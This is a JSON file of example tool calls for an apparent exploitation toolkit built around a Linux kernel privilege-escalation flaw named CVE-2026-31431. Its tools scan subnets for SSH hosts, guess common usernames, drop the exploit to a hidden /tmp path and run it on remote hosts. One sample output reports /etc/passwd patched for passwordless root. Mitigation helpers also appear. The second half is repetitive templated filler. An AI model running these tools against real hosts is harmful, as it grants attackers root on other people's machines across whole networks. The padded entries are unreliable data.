@@ -1,0 +1,1214 @@
+[
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "warning": "WARNING: CVE-2026-31431 Copy Fail is a REAL kernel LPE...",
+      "script": "#!/usr/bin/env python3\nimport os, sys, socket, struct...",
+      "size_bytes": 15342,
+      "sha256": "79db95935596aac01ba525001f8cbaf4dced6c6b3eefae202e7f0bd20ee5e1e8",
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_description": "Returns the full PoC exploit script text with targets"
+  },
+  {
+    "tool": "cf_exploit_local",
+    "input": {
+      "target_path": "/tmp/.cf",
+      "cleanup": true
+    },
+    "output_example": {
+      "status": "ok",
+      "path": "/tmp/.cf",
+      "size_bytes": 15342,
+      "sha256": "79db95935596aac01ba525001f8cbaf4dced6c6b3eefae202e7f0bd20ee5e1e8",
+      "warning": "WARNING: ...",
+      "targets": [
+        "escalate",
+        "write"
+      ],
+      "instructions": [
+        "Script written to /tmp/.cf",
+        "Patch passwd: python3 /tmp/.cf escalate"
+      ]
+    }
+  },
+  {
+    "tool": "cf_exploit_local",
+    "input": {
+      "target_path": "/root/exploit.py",
+      "cleanup": false
+    },
+    "output_example": {
+      "status": "ok",
+      "path": "/root/exploit.py",
+      "size_bytes": 15342
+    }
+  },
+  {
+    "tool": "cf_exploit_local",
+    "input": {
+      "target_path": "/invalid/path/exploit.py"
+    },
+    "output_example": {
+      "status": "error",
+      "error": "Failed to write: [Errno 2] No such file or directory"
+    }
+  },
+  {
+    "tool": "cf_detect_local_wsl",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "distro": "Ubuntu-22.04",
+          "ip": "172.27.112.1",
+          "port": 22
+        },
+        {
+          "distro": "unknown (localhost)",
+          "ip": "127.0.0.1",
+          "port": 22
+        }
+      ],
+      "note": "Found 2 WSL instance(s)"
+    }
+  },
+  {
+    "tool": "cf_detect_local_wsl",
+    "input": {},
+    "output_description": "Detects WSL2 instances on Windows host"
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.1.0/24",
+      "port": 22,
+      "timeout": 1.5,
+      "max_hosts": 50,
+      "only_linux": true
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.1.100",
+          "port": 22,
+          "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3",
+          "os_hint": "Ubuntu Linux"
+        }
+      ],
+      "scanned": 50,
+      "found": 3
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "10.0.0.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "10.0.0.50",
+          "banner": "SSH-2.0-OpenSSH_9.0",
+          "os_hint": "Linux"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.1.0/24",
+      "only_linux": false
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.1.1",
+          "banner": "SSH-2.0-Cisco",
+          "os_hint": "Cisco"
+        },
+        {
+          "ip": "192.168.1.100",
+          "banner": "SSH-2.0-OpenSSH_8.9p1",
+          "os_hint": "Linux"
+        }
+      ]
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "invalid"
+    },
+    "output_example": {
+      "status": "error",
+      "error": "Invalid CIDR notation: invalid"
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.100",
+      "username": "ubuntu",
+      "auto_user": false
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-26-generic",
+      "vulnerable": true,
+      "config_status": "module",
+      "patched": false,
+      "recommendation": "Apply mitigation: blacklist algif_aead",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.100",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "5.15.0-91-generic",
+      "vulnerable": true,
+      "config_status": "builtin",
+      "patched": false,
+      "recommendation": "Apply mitigation: initcall_blacklist (reboot required)",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "10.0.0.1"
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "5.4.0-150-generic",
+      "vulnerable": false,
+      "config_status": "module",
+      "patched": true,
+      "recommendation": "Host is not vulnerable",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.200",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "error",
+      "error": "Could not connect to 192.168.1.200:22 with any common username",
+      "tried": [
+        "root",
+        "ubuntu",
+        "admin"
+      ],
+      "note": "Try explicit --username or check SSH agent keys"
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "10.0.0.50",
+      "username": "admin",
+      "port": 2222
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.5.0-14-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.100",
+      "username": "ubuntu",
+      "target": "escalate",
+      "cleanup": true,
+      "auto_user": false
+    },
+    "output_example": {
+      "status": "ok",
+      "exploit": "root_obtained",
+      "output": "[+] Target kernel 6.2.0-26-generic\n[+] CONFIG_CRYPTO_USER_API_AEAD=m\n[+] Opening AF_ALG socket...\n[+] Triggering race...\n[+] Root obtained! /etc/passwd patched.\n[+] Run 'su root' for passwordless shell.",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "10.0.0.50",
+      "target": "write",
+      "cleanup": false,
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "exploit": "root_obtained",
+      "output": "[+] Arbitrary write test completed",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.200",
+      "username": "admin",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "error",
+      "error": "SSH connection failed",
+      "warning": "WARNING: CVE-2026-31431..."
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "192.168.1.100",
+      "username": "ubuntu",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "mitigation_applied": false,
+      "method": "module_blacklist",
+      "reboot_required": false,
+      "commands": [
+        "echo 'blacklist algif_aead' > /etc/modprobe.d/cve-2026-31431.conf",
+        "rmmod algif_aead 2>/dev/null || true"
+      ],
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.0.50",
+      "dry_run": true,
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "mitigation_applied": false,
+      "method": "initcall_blacklist",
+      "reboot_required": true,
+      "commands": [
+        "grubby --update-kernel=ALL --args='initcall_blacklist=algif_aead_init'"
+      ],
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "192.168.1.100",
+      "dry_run": false
+    },
+    "output_example": {
+      "status": "ok",
+      "mitigation_applied": true,
+      "method": "module_blacklist",
+      "reboot_required": false,
+      "commands": [
+        "echo 'blacklist algif_aead' > /etc/modprobe.d/cve-2026-31431.conf",
+        "rmmod algif_aead"
+      ],
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.0.50",
+      "dry_run": false
+    },
+    "output_example": {
+      "status": "ok",
+      "mitigation_applied": true,
+      "method": "initcall_blacklist",
+      "reboot_required": true,
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.100",
+      "username": "ubuntu",
+      "target": "escalate",
+      "auto_user": false
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-26-generic",
+      "vulnerable": true,
+      "exploit": "root_obtained",
+      "output": "[+] Root obtained!",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "10.0.0.50",
+      "force": true,
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.8.0-31-generic",
+      "vulnerable": true,
+      "exploit": "root_obtained",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "10.0.0.1"
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "5.4.0-150-generic",
+      "vulnerable": false,
+      "exploit": "not_attempted",
+      "reason": "Kernel 5.4 is not vulnerable",
+      "connected_user": "ubuntu"
+    }
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.200",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "error",
+      "error": "Could not connect to 192.168.1.200:22 with any common username"
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_description": "Returns PoC with SHA256 hash and usage instructions"
+  },
+  {
+    "tool": "cf_exploit_local",
+    "input": {},
+    "output_description": "Writes exploit to /tmp/.cf with defaults"
+  },
+  {
+    "tool": "cf_detect_local_wsl",
+    "input": {},
+    "output_description": "Detects local WSL2 instances"
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "10.0.0.0/24",
+      "timeout": 3.0
+    },
+    "output_description": "Scans 10.0.0.0/24 with 3s timeout"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.101",
+      "auto_user": true
+    },
+    "output_description": "Checks host with auto username detection"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "10.0.0.50",
+      "port": 2222,
+      "username": "admin"
+    },
+    "output_description": "Checks host on non-standard SSH port"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.100",
+      "target": "escalate"
+    },
+    "output_description": "Runs escalate exploit on target"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "10.0.0.50",
+      "target": "write",
+      "cleanup": false
+    },
+    "output_description": "Runs write exploit without cleanup"
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "192.168.1.100"
+    },
+    "output_description": "Dry-run mitigation on target"
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.0.50",
+      "dry_run": false
+    },
+    "output_description": "Applies mitigation for real"
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.100"
+    },
+    "output_description": "Full check+exploit assessment"
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.101",
+      "force": true
+    },
+    "output_description": "Forced assessment regardless of kernel"
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "172.16.0.0/24",
+      "port": 2222
+    },
+    "output_description": "Scans Docker bridge network on custom port"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "172.16.0.50",
+      "username": "root"
+    },
+    "output_description": "Checks container host as root"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "172.16.0.50",
+      "username": "root",
+      "target": "escalate"
+    },
+    "output_description": "Exploits container host as root"
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "172.16.0.50",
+      "username": "root",
+      "dry_run": false
+    },
+    "output_description": "Mitigates container host"
+  },
+  {
+    "tool": "cf_detect_local_wsl",
+    "input": {},
+    "output_description": "Discovers WSL instances for local testing"
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.1.0/24",
+      "max_hosts": 10
+    },
+    "output_description": "Scans first 10 hosts of subnet"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "wsl-ubuntu",
+      "auto_user": true,
+      "banner_hint": "Ubuntu"
+    },
+    "output_description": "Checks WSL Ubuntu instance"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.100",
+      "timeout": 60
+    },
+    "output_description": "Checks host with extended 60s SSH timeout"
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.100",
+      "cleanup": false
+    },
+    "output_description": "Assess without cleaning up exploit script"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.100",
+      "timeout": 120
+    },
+    "output_description": "Runs exploit with extended 120s timeout"
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_description": "Returns the multi-target PoC exploit code"
+  },
+  {
+    "tool": "cf_exploit_local",
+    "input": {
+      "target_path": "/tmp/exp.py",
+      "cleanup": false
+    },
+    "output_description": "Writes exploit to /tmp/exp.py without auto-cleanup"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "10.0.0.100",
+      "username": "ec2-user"
+    },
+    "output_description": "Checks AWS EC2 instance"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "10.0.0.101",
+      "username": "azureuser"
+    },
+    "output_description": "Checks Azure VM instance"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.102",
+      "username": "pi"
+    },
+    "output_description": "Checks Raspberry Pi running Linux"
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.1.0/24"
+    },
+    "output_description": "Default subnet scan for Linux SSH hosts"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.103"
+    },
+    "output_description": "Default check with ubuntu user"
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "192.168.1.100",
+      "dry_run": true
+    },
+    "output_description": "Preview mitigation commands"
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "192.168.1.104",
+      "auto_user": true
+    },
+    "output_description": "Full assessment of a fresh target"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.100",
+      "target": "write"
+    },
+    "output_description": "Demonstrates arbitrary page-cache write capability"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.100",
+      "username": "ubuntu"
+    },
+    "output_description": "Basic vulnerability check against target"
+  },
+  {
+    "tool": "cf_assess",
+    "input": {
+      "host": "10.0.0.100",
+      "auto_user": true,
+      "force": false
+    },
+    "output_description": "Check-and-exploit on EC2 instance"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.100"
+    },
+    "output_description": "Minimal form: uses all defaults"
+  },
+  {
+    "tool": "cf_run_exploit",
+    "input": {
+      "host": "192.168.1.100"
+    },
+    "output_description": "Minimal form: runs escalate with defaults"
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "192.168.1.100",
+      "dry_run": false
+    },
+    "output_description": "Applies mitigation without preview"
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.64",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-64-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.64.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.64.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.64.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.65",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-65-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.65.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.65.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.65.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.66",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-66-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.66.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.66.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.66.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.67",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-67-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.67.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.67.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.67.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.68",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-68-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.68.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.68.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.68.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.69",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-69-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.69.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.69.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.69.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.70",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-70-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.70.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.70.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.70.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.71",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-71-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.71.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.71.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.71.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.72",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-72-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.72.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.72.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.72.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.73",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-73-generic",
+      "vulnerable": true
+    }
+  },
+  {
+    "tool": "cf_scan_network",
+    "input": {
+      "cidr": "192.168.73.0/24"
+    },
+    "output_example": {
+      "status": "ok",
+      "hosts": [
+        {
+          "ip": "192.168.73.1"
+        }
+      ],
+      "found": 1
+    }
+  },
+  {
+    "tool": "cf_get_exploit_script",
+    "input": {},
+    "output_example": {
+      "status": "ok",
+      "size_bytes": 15342,
+      "targets": [
+        "escalate",
+        "write"
+      ]
+    }
+  },
+  {
+    "tool": "cf_apply_mitigation",
+    "input": {
+      "host": "10.0.73.1",
+      "dry_run": true
+    },
+    "output_example": {
+      "status": "ok",
+      "method": "module_blacklist",
+      "reboot_required": false
+    }
+  },
+  {
+    "tool": "cf_check_target",
+    "input": {
+      "host": "192.168.1.74",
+      "auto_user": true
+    },
+    "output_example": {
+      "status": "ok",
+      "kernel": "6.2.0-74-generic",
+      "vulnerable": true
+    }
+  }
+]
